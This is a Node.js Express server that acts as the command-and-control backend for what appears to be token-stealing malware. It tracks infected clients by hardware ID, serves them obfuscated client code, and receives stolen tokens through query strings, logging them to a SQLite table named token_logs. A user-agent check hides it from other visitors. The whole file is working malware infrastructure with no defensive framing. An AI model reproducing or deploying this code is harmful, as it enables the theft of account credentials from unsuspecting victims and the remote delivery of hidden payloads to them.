const config = require('../config.json');
const express = require('express');
const app = express();
const port = process.env.PORT || 500;

const db = require('better-sqlite3')(`${__dirname}/./data/db.sqlite`);

const logger = require('./util/logger');
const { getObfuscatedClientCode } = require('./util/obfuscator');
const { getShortHwid } = require('./util/util.js');

let lastPings = {};

require('dotenv').config();

app.use((req, res, next) => {
    if (req.headers['user-agent'] && req.headers['user-agent'] == config.userAgent) {
        next();
    }
});

// pinging / last ping per client
app.get('/p/:hwid', (req, res) => {
    const hwid = req.params.hwid;

    lastPings[hwid] = Date.now();
    logger.info(`${getShortHwid(hwid)} has pinged.`);

    res.status(200).send('');
});

// get client code
app.get('/c/:hwid', (req, res) => {
    logger.info(`Sending client code to ${req.params.hwid}.`);
    res.send(getObfuscatedClientCode());
});

// upload token(s)
app.get('/u/:hwid', (req, res) => {
    const hwid = req.params.hwid;
    let tokens = req.query.t;

    logger.info(`Receiving token(s) from ${hwid}.`);
    console.log(tokens);
    // make sure it's sha256 hashed
    if (hwid.length == 64 && tokens != null) {
        try {
            tokens = JSON.parse(tokens);
        } catch (e) {
            logger.info(`Error JSON parsing tokens: ${e}.`);
            logger.info('Raw: ' + req.query.t);
            res.status(200).send('g');
            return;
        }

        if (tokens.find((t) => JSON.parse(t).token) != null) {
            db.prepare('INSERT INTO token_logs (date, hwid, tokens) VALUES (?, ?, ?)').run(Date.now(), hwid, JSON.stringify(tokens));
            logger.info(`Successfuly received token(s) from ${hwid}.`);
        } else {
            logger.info('No token found in keys.');
            logger.info(`Raw: ${req.query.t}`);
        }
    }

    res.status(200).send('g');
});

app.listen(port, () => {
    logger.info(`App listening on http://localhost:${port}.`);
});

// ping check
setInterval(() => {
    Object.keys(lastPings).forEach((hwid) => {
        if (Date.now() - lastPings[hwid] > 60 * 1000) {
            delete lastPings[hwid];
            logger.info(`${hwid} has most likely disconnected, removing from client list. (no ping in 60s)`);
        }
    });
}, 1000);
